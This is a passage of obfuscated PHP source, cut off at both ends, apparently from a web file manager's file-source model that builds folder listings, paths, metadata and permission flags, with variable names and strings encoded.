_listFilterInfo(&$ïÑŞ•°, $õÙÖ˜ŞÄ = false) { $¡‹İê½ˆ =& $_SERVER[³Ôà×Ó]; foreach ($ïÑŞ•° as &$÷½›„¶) { $÷½›„¶ = $this->pathInfoFilter($÷½›„¶); self::$cachePathInfo[$¡‹İê½ˆ[543] . intval($õÙÖ˜ŞÄ) . $¡‹İê½ˆ[471] . $÷½›„¶[$¡‹İê½ˆ[193]]] = $÷½›„¶; } unset($÷½›„¶); } protected function _listMake(&$äÚƒ—…Ì) { $ÇĞÇ•Š =& $_SERVER[³Ôà×Ó]; $äÚƒ—…Ì[$ÇĞÇ•Š[85]] = array(); $äÚƒ—…Ì[$ÇĞÇ•Š[86]] = array(); foreach ($äÚƒ—…Ì[$ÇĞÇ•Š[454]] as $¾ÍÎ¢±”) { $¬°§ÒÏú = $¾ÍÎ¢±”[$ÇĞÇ•Š[494]] == 1 ? $ÇĞÇ•Š[85] : $ÇĞÇ•Š[86]; $äÚƒ—…Ì[$¬°§ÒÏú][] = $¾ÍÎ¢±”; } unset($äÚƒ—…Ì[$ÇĞÇ•Š[454]]); } protected function _listAppendMeta(&$ğª¥Ôãª, $ˆ…¿„£) { $Ş·¤Îı× =& $_SERVER[³Ôà×Ó]; $×Î¤¥± = array($Ş·¤Îı×[500] => array($Ş·¤Îı×[501], $ˆ…¿„£)); $ó•“ºûê = Model($Ş·¤Îı×[544])->field($Ş·¤Îı×[545])->where($×Î¤¥±)->select(); if (!$ó•“ºûê) { return; } $¶™şİºú = array($Ş·¤Îı×[546], $Ş·¤Îı×[547], $Ş·¤Îı×[526]); $š™ç†ğ¡ = array(); foreach ($ó•“ºûê as $é„Ÿ’€) { if (!isset($š™ç†ğ¡[$é„Ÿ’€[$Ş·¤Îı×[193]]])) { $š™ç†ğ¡[$é„Ÿ’€[$Ş·¤Îı×[193]]] = array(); } if (in_array($é„Ÿ’€[$Ş·¤Îı×[97]], $¶™şİºú)) { continue; } $š™ç†ğ¡[$é„Ÿ’€[$Ş·¤Îı×[193]]][$é„Ÿ’€[$Ş·¤Îı×[97]]] = $é„Ÿ’€[$Ş·¤Îı×[459]]; } foreach ($ğª¥Ôãª as &$¥”ş¾†) { $¥”ş¾†[$Ş·¤Îı×[548]] = !1; if (isset($š™ç†ğ¡[$¥”ş¾†[$Ş·¤Îı×[193]]])) { $¥”ş¾†[$Ş·¤Îı×[548]] = $š™ç†ğ¡[$¥”ş¾†[$Ş·¤Îı×[193]]]; } if ($this->fileIsLock($¥”ş¾†) && $¥”ş¾†[$Ş·¤Îı×[496]]) { $‚êÕƒ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $¥”ş¾†[$Ş·¤Îı×[496]][$Ş·¤Îı×[497]] = AuthModel::authDisable($¥”ş¾†[$Ş·¤Îı×[496]][$Ş·¤Îı×[497]], $‚êÕƒ); $¥”ş¾†[$Ş·¤Îı×[496]][$Ş·¤Îı×[549]][$Ş·¤Îı×[496]] = $¥”ş¾†[$Ş·¤Îı×[496]][$Ş·¤Îı×[497]]; } } unset($¥”ş¾†); } protected function _listAppendFileMeta(&$³Ä©»ËÖ, $¶ìªÅÂë) { $í£¼ä—… =& $_SERVER[³Ôà×Ó]; $ğÙ™äÒÛ = array_to_keyvalue($³Ä©»ËÖ, $í£¼ä—…[12], $í£¼ä—…[550]); $ğÙ™äÒÛ = array_filter(array_unique($ğÙ™äÒÛ)); if (!$ğÙ™äÒÛ) { return; } $ı§Ğ×û¦ = array($í£¼ä—…[551] => array($í£¼ä—…[501], $ğÙ™äÒÛ)); $÷¨Ñ­ô = $í£¼ä—…[552]; $èŒÕªë = Model($í£¼ä—…[553])->field($÷¨Ñ­ô)->where($ı§Ğ×û¦)->select(); $èŒÕªë = array_to_keyvalue($èŒÕªë, $í£¼ä—…[550]); $ü¡íØùˆ = Model($í£¼ä—…[554])->field($í£¼ä—…[555])->where($ı§Ğ×û¦)->select(); $ü¡íØùˆ = $ü¡íØùˆ ? $ü¡íØùˆ : array(); $¼ùüßç = array(); foreach ($ü¡íØùˆ as $ŞÉ•ºİ ) { if (!isset($¼ùüßç[$ŞÉ•ºİ [$í£¼ä—…[550]]])) { $¼ùüßç[$ŞÉ•ºİ [$í£¼ä—…[550]]] = array(); } $¼ùüßç[$ŞÉ•ºİ [$í£¼ä—…[550]]][$ŞÉ•ºİ [$í£¼ä—…[97]]] = $ŞÉ•ºİ [$í£¼ä—…[459]]; } foreach ($³Ä©»ËÖ as &$ÃÁÊ¸üê) { $ûäÂ¤›— = $ÃÁÊ¸üê[$í£¼ä—…[550]]; if (!$ûäÂ¤›— || !is_array($èŒÕªë[$ûäÂ¤›—])) { continue; } $›À“¢ = $èŒÕªë[$ûäÂ¤›—]; $›À“¢[$í£¼ä—…[79]] = $ÃÁÊ¸üê[$í£¼ä—…[79]]; $›À“¢[$í£¼ä—…[32]] = $ÃÁÊ¸üê[$í£¼ä—…[32]]; if (!$›À“¢[$í£¼ä—…[556]]) { Model($í£¼ä—…[553])->fileMd5Check($›À“¢); } if (!isset(self::$cacheFileInfo[$í£¼ä—…[557] . $ûäÂ¤›—])) { self::$cacheFileInfo[$í£¼ä—…[557] . $ûäÂ¤›—] = array_merge(array(), $›À“¢); } unset($èŒÕªë[$ûäÂ¤›—][$í£¼ä—…[87]]); $ÑÊ³á¨” = isset($¼ùüßç[$ûäÂ¤›—]) && is_array($¼ùüßç[$ûäÂ¤›—]) ? $¼ùüßç[$ûäÂ¤›—] : array(); $ÃÁÊ¸üê[$í£¼ä—…[170]] = array_merge($ÑÊ³á¨”, $èŒÕªë[$ûäÂ¤›—]); if (isset($ÃÁÊ¸üê[$í£¼ä—…[170]][$í£¼ä—…[184]])) { $ÃÁÊ¸üê[$í£¼ä—…[184]] = json_decode($ÃÁÊ¸üê[$í£¼ä—…[170]][$í£¼ä—…[184]], !0); unset($ÃÁÊ¸üê[$í£¼ä—…[170]][$í£¼ä—…[184]]); } } unset($ÃÁÊ¸üê); } protected function _listAppendSourceInfo(&$œ‡ÅÍ‹¤, $¾åßã¬±) { $ƒÉ¿ƒæÆ =& $_SERVER[³Ôà×Ó]; $ÎòûÀ = Model($ƒÉ¿ƒæÆ[558])->listData(); $ÉÌ»¦öû = Model($ƒÉ¿ƒæÆ[508])->listData(); $¿’²’ó• = Model($ƒÉ¿ƒæÆ[498])->listData(); $ñõƒşÕƒ = Model($ƒÉ¿ƒæÆ[559])->listSimple(); $Ÿó€¥˜Â = array_to_keyvalue($ÎòûÀ, $ƒÉ¿ƒæÆ[484]); $œšª©şá = array_to_keyvalue_group($ÉÌ»¦öû, $ƒÉ¿ƒæÆ[87], $ƒÉ¿ƒæÆ[509]); $œîÜ„ü = array_to_keyvalue($¿’²’ó•, $ƒÉ¿ƒæÆ[87]); $½¦ğ¸ù¡ = array_to_keyvalue_group($ñõƒşÕƒ, $ƒÉ¿ƒæÆ[193]); foreach ($œ‡ÅÍ‹¤ as &$›ƒ™¹) { $›ƒ™¹[$ƒÉ¿ƒæÆ[90]] = array($ƒÉ¿ƒæÆ[560] => 0, $ƒÉ¿ƒæÆ[561] => 0, $ƒÉ¿ƒæÆ[562] => 0); if (isset($œîÜ„ü[$›ƒ™¹[$ƒÉ¿ƒæÆ[193]]])) { $›ƒ™¹[$ƒÉ¿ƒæÆ[90]][$ƒÉ¿ƒæÆ[563]] = 1; $›ƒ™¹[$ƒÉ¿ƒæÆ[90]][$ƒÉ¿ƒæÆ[564]] = $œîÜ„ü[$›ƒ™¹[$ƒÉ¿ƒæÆ[193]]][$ƒÉ¿ƒæÆ[32]]; } if ($œšª©şá && $Ÿó€¥˜Â && isset($œšª©şá[$›ƒ™¹[$ƒÉ¿ƒæÆ[193]]])) { $›ƒ™¹[$ƒÉ¿ƒæÆ[90]][$ƒÉ¿ƒæÆ[565]] = array(); foreach ($œšª©şá[$›ƒ™¹[$ƒÉ¿ƒæÆ[193]]] as $”‚ïãŒ) { $Ğˆğ•‰ˆ = $Ÿó€¥˜Â[$”‚ïãŒ]; $›ƒ™¹[$ƒÉ¿ƒæÆ[90]][$ƒÉ¿ƒæÆ[565]][] = array($ƒÉ¿ƒæÆ[566] => $Ğˆğ•‰ˆ[$ƒÉ¿ƒæÆ[484]], $ƒÉ¿ƒæÆ[503] => $Ğˆğ•‰ˆ[$ƒÉ¿ƒæÆ[32]], $ƒÉ¿ƒæÆ[567] => $Ğˆğ•‰ˆ[$ƒÉ¿ƒæÆ[568]]); } } if ($½¦ğ¸ù¡ && isset($½¦ğ¸ù¡[$›ƒ™¹[$ƒÉ¿ƒæÆ[193]]])) { $›ƒ™¹[$ƒÉ¿ƒæÆ[90]][$ƒÉ¿ƒæÆ[569]] = array(); foreach ($½¦ğ¸ù¡[$›ƒ™¹[$ƒÉ¿ƒæÆ[193]]] as $¢åÌÇ†·) { $­ığ˜Á = $ƒÉ¿ƒæÆ[570]; if ($¢åÌÇ†·[$ƒÉ¿ƒæÆ[571]] == $ƒÉ¿ƒæÆ[91]) { $­ığ˜Á .= $ƒÉ¿ƒæÆ[572]; } $›ƒ™¹[$ƒÉ¿ƒæÆ[90]][$ƒÉ¿ƒæÆ[569]] = array_field_key($¢åÌÇ†·, explode($ƒÉ¿ƒæÆ[50], $­ığ˜Á)); } } } unset($›ƒ™¹); return $œ‡ÅÍ‹¤; } protected function _listAppendChildren(&$ËÇ³øË¼, $ÏÉªİ) { $ğŒŸÀ„ê =& $_SERVER[³Ôà×Ó]; $õ‹Ùóš‘ = array(); $Ä‹åË­¤ = array($ğŒŸÀ„ê[239] => 0, $ğŒŸÀ„ê[240] => 0); foreach ($ËÇ³øË¼ as &$‹ëõß€) { if (!$‹ëõß€[$ğŒŸÀ„ê[494]]) { continue; } $õ‹Ùóš‘[] = $‹ëõß€[$ğŒŸÀ„ê[193]]; } unset($‹ëõß€); if (!$õ‹Ùóš‘) { return; } $½€øÌã = array($ğŒŸÀ„ê[192] => array($ğŒŸÀ„ê[7], $õ‹Ùóš‘), $ğŒŸÀ„ê[514] => 0); $˜à„À°ù = array($ğŒŸÀ„ê[192], $ğŒŸÀ„ê[494], $ğŒŸÀ„ê[573] => $ğŒŸÀ„ê[574]); $‹•†‰ùè = $this->field($˜à„À°ù)->where($½€øÌã)->group($ğŒŸÀ„ê[575])->select(); $µµ¾ä¼« = array(); foreach ($‹•†‰ùè as $•Œ×Âº ) { $ù£·Î®Š = $•Œ×Âº [$ğŒŸÀ„ê[192]]; $Ò¤”àï× = $•Œ×Âº [$ğŒŸÀ„ê[494]] == $ğŒŸÀ„ê[91] ? $ğŒŸÀ„ê[240] : $ğŒŸÀ„ê[239]; if (!isset($µµ¾ä¼«[$ù£·Î®Š])) { $µµ¾ä¼«[$ù£·Î®Š] = array($ğŒŸÀ„ê[239] => 0, $ğŒŸÀ„ê[240] => 0); } $µµ¾ä¼«[$ù£·Î®Š][$Ò¤”àï×] += $•Œ×Âº [$ğŒŸÀ„ê[574]]; } foreach ($ËÇ³øË¼ as &$‹ëõß€) { if (!$‹ëõß€[$ğŒŸÀ„ê[494]]) { continue; } $ËíÅåÀÃ = is_array($µµ¾ä¼«[$‹ëõß€[$ğŒŸÀ„ê[193]]]) ? $µµ¾ä¼«[$‹ëõß€[$ğŒŸÀ„ê[193]]] : $Ä‹åË­¤; $‹ëõß€[$ğŒŸÀ„ê[240]] = $ËíÅåÀÃ[$ğŒŸÀ„ê[240]]; $‹ëõß€[$ğŒŸÀ„ê[239]] = $ËíÅåÀÃ[$ğŒŸÀ„ê[239]]; unset($‹ëõß€[$ğŒŸÀ„ê[495]]); } unset($‹ëõß€); } protected function _listAppendAuth(&$·Ù¢¹Öë) { $Ü“ÙŸµ¹ =& $_SERVER[³Ôà×Ó]; $ğäŠí¥ = array(); foreach ($·Ù¢¹Öë as $ÍÜœ†) { if ($ÍÜœ†[$Ü“ÙŸµ¹[190]] == self::TYPE_GROUP) { $ğäŠí¥[] = $ÍÜœ†[$Ü“ÙŸµ¹[193]]; } } if (!$ğäŠí¥) { return; } $™éùÃò‰ = array_to_keyvalue($·Ù¢¹Öë, $Ü“ÙŸµ¹[193]); $Â¿±ó±€ = Model($Ü“ÙŸµ¹[576])->getSourceList($ğäŠí¥, $™éùÃò‰); $ÓÄ§şçè = KodUser::isRoot(); foreach ($·Ù¢¹Öë as $ ˆŸúÜÃ => &$ÍÜœ†) { $ÍÜœ†[$Ü“ÙŸµ¹[496]] = $Â¿±ó±€[$ÍÜœ†[$Ü“ÙŸµ¹[193]]]; if (!$ÍÜœ†[$Ü“ÙŸµ¹[496]] && $ÍÜœ†[$Ü“ÙŸµ¹[190]] == self::TYPE_GROUP) { $ÍÜœ†[$Ü“ÙŸµ¹[496]] = Action($Ü“ÙŸµ¹[577])->pathGroupAuthMake($ÍÜœ†[$Ü“ÙŸµ¹[578]]); if (!$ÍÜœ†[$Ü“ÙŸµ¹[496]] && !$ÓÄ§şçè) { $ÍÜœ†[$Ü“ÙŸµ¹[233]] = !1; $ÍÜœ†[$Ü“ÙŸµ¹[232]] = !1; } } if ($ÍÜœ†[$Ü“ÙŸµ¹[496]]) { $ÍÜœ†[$Ü“ÙŸµ¹[233]] = AuthModel::authCheckEdit($ÍÜœ†[$Ü“ÙŸµ¹[496]][$Ü“ÙŸµ¹[497]]); $ÍÜœ†[$Ü“ÙŸµ¹[232]] = AuthModel::authCheckView($ÍÜœ†[$Ü“ÙŸµ¹[496]][$Ü“ÙŸµ¹[497]]); } $this->groupPathDisplay($ÍÜœ†); } unset($ÍÜœ†); } public function _listAppendAuthSecret(&$ÁÖÏ†©) { $ˆ‹çû½å =& $_SERVER[³Ôà×Ó]; if (Model($ˆ‹çû½å[517])->get($ˆ‹çû½å[579]) != $ˆ‹çû½å[91]) { return; } static $Áş¯¨ÀÆ = false; if (!$Áş¯¨ÀÆ) { $ÉØÎü = Model($ˆ‹çû½å[580]); $‘…ñ™À› = Model($ˆ‹çû½å[581]); $Áş¯¨ÀÆ = $‘…ñ™À›->listData(); $Áş¯¨ÀÆ = array_to_keyvalue($Áş¯¨ÀÆ, $ˆ‹çû½å[193]); $¥¼ğû¾ä = json_decode(Model($ˆ‹çû½å[517])->get($ˆ‹çû½å[582]), !0); $¥¼ğû¾ä = array_to_keyvalue($¥¼ğû¾ä, $ˆ‹çû½å[484]); foreach ($Áş¯¨ÀÆ as $¸÷±ùˆ² => $ş¤¿ÏÜõ) { $Ë´¿âŸ˜ = $¥¼ğû¾ä[$ş¤¿ÏÜõ[$ˆ‹çû½å[583]]]; if (!$Ë´¿âŸ˜) { $‘…ñ™À›->remove($ş¤¿ÏÜõ[$ˆ‹çû½å[484]]); unset($Áş¯¨ÀÆ[$¸÷±ùˆ²]); continue; } $®ªÜ‘Ší = $ÉØÎü->listData($Ë´¿âŸ˜[$ˆ‹çû½å[496]]); if (!$®ªÜ‘Ší) { $‘…ñ™À›->remove($ş¤¿ÏÜõ[$ˆ‹çû½å[484]]); unset($Áş¯¨ÀÆ[$¸÷±ùˆ²]); continue; } $ş¤¿ÏÜõ[$ˆ‹çû½å[496]] = $®ªÜ‘Ší; $ş¤¿ÏÜõ[$ˆ‹çû½å[584]] = $Ë´¿âŸ˜; $ş¤¿ÏÜõ[$ˆ‹çû½å[585]] = Model($ˆ‹çû½å[586])->getInfoSimpleOuter($ş¤¿ÏÜõ[$ˆ‹çû½å[536]]); $Áş¯¨ÀÆ[$¸÷±ùˆ²] = $ş¤¿ÏÜõ; } } $Ë¼İ„Î‹ = USER_ID; $¤Ïšá˜ = array(); $·“ï±ª¾ = $this->_listAppendPath($¤Ïšá˜, !0); foreach ($ÁÖÏ†© as $¸÷±ùˆ² => &$ş¤¿ÏÜõ) { if (!is_array($ş¤¿ÏÜõ[$ˆ‹çû½å[496]])) { continue; } if ($ş¤¿ÏÜõ[$ˆ‹çû½å[190]] != $ˆ‹çû½å[587]) { continue; } if (isset($Áş¯¨ÀÆ[$ş¤¿ÏÜõ[$ˆ‹çû½å[193]]])) { $ş•œŠè = $Áş¯¨ÀÆ[$ş¤¿ÏÜõ[$ˆ‹çû½å[193]]]; if (!is_array($ş¤¿ÏÜõ[$ˆ‹çû½å[548]])) { $ş¤¿ÏÜõ[$ˆ‹çû½å[548]] = array(); } $ş¤¿ÏÜõ[$ˆ‹çû½å[548]][$ˆ‹çû½å[588]] = $ş•œŠè[$ˆ‹çû½å[583]]; $ş¤¿ÏÜõ[$ˆ‹çû½å[496]][$ˆ‹çû½å[589]] = $ş•œŠè; $ş¤¿ÏÜõ[$ˆ‹çû½å[496]][$ˆ‹çû½å[590]] = $ş¤¿ÏÜõ[$ˆ‹çû½å[591]]; $ş¤¿ÏÜõ[$ˆ‹çû½å[496]][$ˆ‹çû½å[592]] = $ˆ‹çû½å[91]; if ($ş•œŠè[$ˆ‹çû½å[536]] != $Ë¼İ„Î‹) { $ş¤¿ÏÜõ[$ˆ‹çû½å[496]][$ˆ‹çû½å[497]] = $ş¤¿ÏÜõ[$ˆ‹çû½å[496]][$ˆ‹çû½å[497]] & $ş•œŠè[$ˆ‹çû½å[496]][$ˆ‹çû½å[496]]; } continue; } $¬ğÌı¾ = $this->parentLevelArray($ş¤¿ÏÜõ[$ˆ‹çû½å[593]]); $—ğÁÆ¥ = array_reverse($¬ğÌı¾); foreach ($—ğÁÆ¥ as $›ûçâª… => $ù¡ÓÕæŒ) { if (!isset($Áş¯¨ÀÆ[$ù¡ÓÕæŒ])) { continue; } $ş•œŠè = $Áş¯¨ÀÆ[$ù¡ÓÕæŒ]; $ş¤¿ÏÜõ[$ˆ‹çû½å[496]][$ˆ‹çû½å[589]] = $ş•œŠè; if ($ş•œŠè[$ˆ‹çû½å[536]] != $Ë¼İ„Î‹) { $ş¤¿ÏÜõ[$ˆ‹çû½å[496]][$ˆ‹çû½å[497]] = $ş¤¿ÏÜõ[$ˆ‹çû½å[496]][$ˆ‹çû½å[497]] & $ş•œŠè[$ˆ‹çû½å[496]][$ˆ‹çû½å[496]]; } $“é‘§’© = $ˆ‹çû½å[12]; $¾í©²”€ = count($¬ğÌı¾) - $›ûçâª…; for ($óş´²¶ = 0; $óş´²¶ < $¾í©²”€; $óş´²¶++) { if (!isset($·“ï±ª¾[$¬ğÌı¾[$óş´²¶]])) { $“é‘§’© = $ˆ‹çû½å[12]; break; } $“é‘§’© = $“é‘§’© . rtrim($·“ï±ª¾[$¬ğÌı¾[$óş´²¶]], $ˆ‹çû½å[8]) . $ˆ‹çû½å[8]; } $ş¤¿ÏÜõ[$ˆ‹çû½å[496]][$ˆ‹çû½å[590]] = rtrim($“é‘§’©, $ˆ‹çû½å[8]) . $ˆ‹çû½å[8]; break; } } unset($ş¤¿ÏÜõ); } public function groupPathDisplay(&$Ë˜À‚Ó‰) { $ëòàíŒ =& $_SERVER[³Ôà×Ó]; if ($Ë˜À‚Ó‰[$ëòàíŒ[190]] != self::TYPE_GROUP) { return; } $ˆŸ È“ = Model($ëòàíŒ[594])->getInfo($Ë˜À‚Ó‰[$ëòàíŒ[578]]); $Ò½±òì = $this->parentLevelArray($ˆŸ È“[$ëòàíŒ[593]]); $Ğ³Ÿ„æ = $ëòàíŒ[12]; foreach ($Ò½±òì as $˜º¤˜Ş—) { $ù†•±Ÿ‚ = Model($ëòàíŒ[594])->getInfo($˜º¤˜Ş—); $Ğ³Ÿ„æ .= $ù†•±Ÿ‚[$ëòàíŒ[90]][$ëòàíŒ[193]] . $ëòàíŒ[50]; } $Ë˜À‚Ó‰[$ëòàíŒ[595]] = $ˆŸ È“[$ëòàíŒ[192]]; $Ë˜À‚Ó‰[$ëòàíŒ[596]] = $ˆŸ È“[$ëòàíŒ[593]]; $Ë˜À‚Ó‰[$ëòàíŒ[597]] = $ˆŸ È“[$ëòàíŒ[598]]; $Ë˜À‚Ó‰[$ëòàíŒ[599]] = $Ğ³Ÿ„æ . $ˆŸ È“[$ëòàíŒ[90]][$ëòàíŒ[193]]; } protected function _listAppendPath(&$Ë÷—ØªŠ, $†è©ÀáÜ = false) { $½â¹ü¹¹ =& $_SERVER[³Ôà×Ó]; static $ç‚ÖĞË = array(); $Ùàì¾Ö° = array(); $Õ´¦Õ´Ğ = array(); if ($†è©ÀáÜ) { return $ç‚ÖĞË; } foreach ($Ë÷—ØªŠ as &$§»§šÈä) { $Êèéç = $§»§šÈä[$½â¹ü¹¹[193]]; if ($§»§šÈä[$½â¹ü¹¹[494]] == $½â¹ü¹¹[91] && $§»§šÈä[$½â¹ü¹¹[192]] != 0) { $ç‚ÖĞË[$Êèéç] = $§»§šÈä[$½â¹ü¹¹[32]]; } if ($§»§šÈä[$½â¹ü¹¹[494]] == $½â¹ü¹¹[91] && $§»§šÈä[$½â¹ü¹¹[192]] == 0) { $ç‚ÖĞË[$Êèéç] = $this->_listAppendPathRoot($§»§šÈä, array()); } if (isset($Õ´¦Õ´Ğ[$§»§šÈä[$½â¹ü¹¹[593]]])) { continue; } $Õ´¦Õ´Ğ[$§»§šÈä[$½â¹ü¹¹[593]]] = !0; $óÉ§ˆ’Ê = $this->parentLevelArray($§»§šÈä[$½â¹ü¹¹[593]]); foreach ($óÉ§ˆ’Ê as $¡òå¸Ñš => $¶€íº×) { if (isset($ç‚ÖĞË[$¶€íº×])) { continue; } if ($¡òå¸Ñš == 0) { $ç‚ÖĞË[$¶€íº×] = $this->_listAppendPathRoot($§»§šÈä, $óÉ§ˆ’Ê); } if ($¡òå¸Ñš != 0) { $Ùàì¾Ö°[] = $¶€íº×; } } } unset($§»§šÈä); $Ùàì¾Ö° = array_unique($Ùàì¾Ö°); if (count($Ùàì¾Ö°) > 0) { $®Ã™”şñ = array($½â¹ü¹¹[500] => array($½â¹ü¹¹[501], $Ùàì¾Ö°)); if (count($Ùàì¾Ö°) == 1) { $‚‘Ã¼¥• = $this->sourceInfo($Ùàì¾Ö°[0]); $‚ÏªŒêã = is_array($‚‘Ã¼¥•) ? array($‚‘Ã¼¥•) : !1; } else { $‚ÏªŒêã = $this->field($½â¹ü¹¹[600])->where($®Ã™”şñ)->select(); } if (!$‚ÏªŒêã) { $‚ÏªŒêã = array(); } foreach ($‚ÏªŒêã as $¯İÖİ×Ğ) { $ç‚ÖĞË[$¯İÖİ×Ğ[$½â¹ü¹¹[193]]] = $¯İÖİ×Ğ[$½â¹ü¹¹[32]]; } } $²ó½æØ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ˆê—ã½¢ = array(); foreach ($Ë÷—ØªŠ as &$§»§šÈä) { $° ÙÃú½ = $§»§šÈä[$½â¹ü¹¹[593]]; $›Å¼³®° = $½â¹ü¹¹[12]; if (isset($ˆê—ã½¢[$° ÙÃú½])) { $›Å¼³®° = $ˆê—ã½¢[$° ÙÃú½]; } else { $óÉ§ˆ’Ê = $this->parentLevelArray($§»§šÈä[$½â¹ü¹¹[593]]); foreach ($óÉ§ˆ’Ê as $¡òå¸Ñš => $¶€íº×) { if (isset($ç‚ÖĞË[$¶€íº×])) { $›Å¼³®° .= $ç‚ÖĞË[$¶€íº×] . $½â¹ü¹¹[8]; } } $ˆê—ã½¢[$° ÙÃú½] = $›Å¼³®°; } $›Å¼³®° .= $§»§šÈä[$½â¹ü¹¹[32]]; if ($§»§šÈä[$½â¹ü¹¹[494]] == $½â¹ü¹¹[91]) { $›Å¼³®° .= $½â¹ü¹¹[8]; } $§»§šÈä[$½â¹ü¹¹[591]] = str_replace($½â¹ü¹¹[601], $½â¹ü¹¹[8], $›Å¼³®°); if ($§»§šÈä[$½â¹ü¹¹[192]] == $½â¹ü¹¹[228]) { $§»§šÈä[$½â¹ü¹¹[32]] = trim($ç‚ÖĞË[$§»§šÈä[$½â¹ü¹¹[193]]], $½â¹ü¹¹[8]); $§»§šÈä[$½â¹ü¹¹[591]] = $§»§šÈä[$½â¹ü¹¹[32]] . $½â¹ü¹¹[8]; } if (intval($§»§šÈä[$½â¹ü¹¹[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($§»§šÈä, $óÉ§ˆ’Ê, $²ó½æØ); } } unset($§»§šÈä); return $Ë÷—ØªŠ; } private function _listAppendPathRecycle(&$“é¥È“«, $õ™âóÑş, $…ÄÌà€ö) { $·í‹’‚Œ =& $_SERVER[³Ôà×Ó]; if (!in_array($…ÄÌà€ö, $õ™âóÑş) && $“é¥È“«[$·í‹’‚Œ[193]] != $…ÄÌà€ö) { return; } $¼‡û‚ƒë = explode($·í‹’‚Œ[8], trim($“é¥È“«[$·í‹’‚Œ[591]], $·í‹’‚Œ[8])); $ÈÕŞ’Ø = implode($·í‹’‚Œ[8], array_slice($¼‡û‚ƒë, 2)); $“é¥È“«[$·í‹’‚Œ[591]] = $·í‹’‚Œ[8] . LNG($·í‹’‚Œ[602]) . $·í‹’‚Œ[8] . ltrim($ÈÕŞ’Ø, $·í‹’‚Œ[8]); $“é¥È“«[$·í‹’‚Œ[593]] = $·í‹’‚Œ[603] . implode($·í‹’‚Œ[50], array_slice($õ™âóÑş, 1)) . $·í‹’‚Œ[50]; if ($“é¥È“«[$·í‹’‚Œ[193]] == $…ÄÌà€ö) { $“é¥È“«[$·í‹’‚Œ[593]] = $·í‹’‚Œ[603]; $“é¥È“«[$·í‹’‚Œ[192]] = $·í‹’‚Œ[228]; $“é¥È“«[$·í‹’‚Œ[32]] = LNG($·í‹’‚Œ[602]); } $“é¥È“«[$·í‹’‚Œ[604]] = $·í‹’‚Œ[605]; } protected function _listAppendPathRoot(&$Ò“ğóĞ¦, $·©æ‡ø¸) { $ñ›·ã‘ =& $_SERVER[³Ôà×Ó]; static $°Õ†²Òª = false; $àãŸºç = $ñ›·ã‘[12]; if ($Ò“ğóĞ¦[$ñ›·ã‘[190]] == self::TYPE_USER) { if ($Ò“ğóĞ¦[$ñ›·ã‘[578]] == USER_ID) { $àãŸºç = LNG($ñ›·ã‘[606]); if ($°Õ†²Òª === !1) { $È††°§² = Model($ñ›·ã‘[607])->getInfoFull(USER_ID); $°Õ†²Òª = _get($È††°§², $ñ›·ã‘[608], $ñ›·ã‘[12]); } if ($·©æ‡ø¸ && $·©æ‡ø¸[0] == $°Õ†²Òª || !$·©æ‡ø¸ && $Ò“ğóĞ¦[$ñ›·ã‘[193]] == $°Õ†²Òª) { $àãŸºç = LNG($ñ›·ã‘[609]); $Ò“ğóĞ¦[$ñ›·ã‘[610]] = $ñ›·ã‘[611]; } if (!$·©æ‡ø¸) { $Ò“ğóĞ¦[$ñ›·ã‘[32]] = $àãŸºç; } } else { $Ò“ğóĞ¦[$ñ›·ã‘[612]] = Model($ñ›·ã‘[586])->getInfoSimpleOuter($Ò“ğóĞ¦[$ñ›·ã‘[578]]); $àãŸºç = LNG($ñ›·ã‘[613]) . $ñ›·ã‘[176] . $Ò“ğóĞ¦[$ñ›·ã‘[612]][$ñ›·ã‘[32]] . $ñ›·ã‘[178]; } } else { if ($Ò“ğóĞ¦[$ñ›·ã‘[190]] == self::TYPE_GROUP) { $ø¥…é† = Model($ñ›·ã‘[594])->getInfoSimple($Ò“ğóĞ¦[$ñ›·ã‘[578]]); $àãŸºç = $ø¥…é†[$ñ›·ã‘[32]]; } else { if ($Ò“ğóĞ¦[$ñ›·ã‘[190]] == self::TYPE_SYSTEM) { $àãŸºç = $ñ›·ã‘[614]; } } } $àãŸºç = $àãŸºç ? $ñ›·ã‘[8] . $àãŸºç . $ñ›·ã‘[8] : $ñ›·ã‘[8]; return $àãŸºç; } protected function _listAppendUser(&$şª –“) { $Éä‰í =& $_SERVER[³Ôà×Ó]; $ªş˜‰Œ = array_to_keyvalue($şª –“, $Éä‰í[12], $Éä‰í[536]); $àÀÚĞ´Å = array_to_keyvalue($şª –“, $Éä‰í[12], $Éä‰í[538]); $ÜÁ¢¼­Ì = array_merge($ªş˜‰Œ, $àÀÚĞ´Å); $‚ÕŞÃ‘î = Model($Éä‰í[607])->userListInfo($ÜÁ¢¼­Ì); foreach ($şª –“ as &$ëĞøçéµ) { $¨æ¦ˆû» = $ëĞøçéµ[$Éä‰í[536]]; $ëĞøçéµ[$Éä‰í[536]] = $‚ÕŞÃ‘î[$¨æ¦ˆû»] ? $‚ÕŞÃ‘î[$¨æ¦ˆû»] : !1; $¨æ¦ˆû» = $ëĞøçéµ[$Éä‰í[538]]; $ëĞøçéµ[$Éä‰í[538]] = $‚ÕŞÃ‘î[$¨æ¦ˆû»] ? $‚ÕŞÃ‘î[$¨æ¦ˆû»] : !1; if (_get($ëĞøçéµ, $Éä‰í[615], 0)) { $ıœˆ°ç = $GLOBALS[$Éä‰í[6]][$Éä‰í[92]][$Éä‰í[616]]; if ($ëĞøçéµ[$Éä‰í[548]][$Éä‰í[617]] <= time() - $ıœˆ°ç) { $this->metaSet($ëĞøçéµ[$Éä‰í[193]], $Éä‰í[618], null); $this->metaSet($ëĞøçéµ[$Éä‰í[193]], $Éä‰í[617], null); unset($ëĞøçéµ[$Éä‰í[548]][$Éä‰í[618]]); continue; } $Ïñ¸‚ãü = $ëĞøçéµ[$Éä‰í[548]][$Éä‰í[618]]; $ëĞøçéµ[$Éä‰í[548]][$Éä‰í[619]] = Model($Éä‰í[607])->getInfoSimpleOuter($Ïñ¸‚ãü); } } unset($ëĞøçéµ); } public function parentLevelArray($ê„¶¦) { $¹ á¼» =& $_SERVER[³Ôà×Ó]; $ê„¶¦ = explode($¹ á¼»[50], trim($ê„¶¦, $¹ á¼»[50])); return array_remove_value($ê„¶¦, $¹ á¼»[228]); } public function listAll($ßòÌ¾Õú) { $–¨Ùã®¿ =& $_SERVER[³Ôà×Ó]; $Ÿîü‰©º = $this->sourceInfo($ßòÌ¾Õú); $¨ŠüÛ³è = array($–¨Ùã®¿[620] => array($–¨Ùã®¿[621], 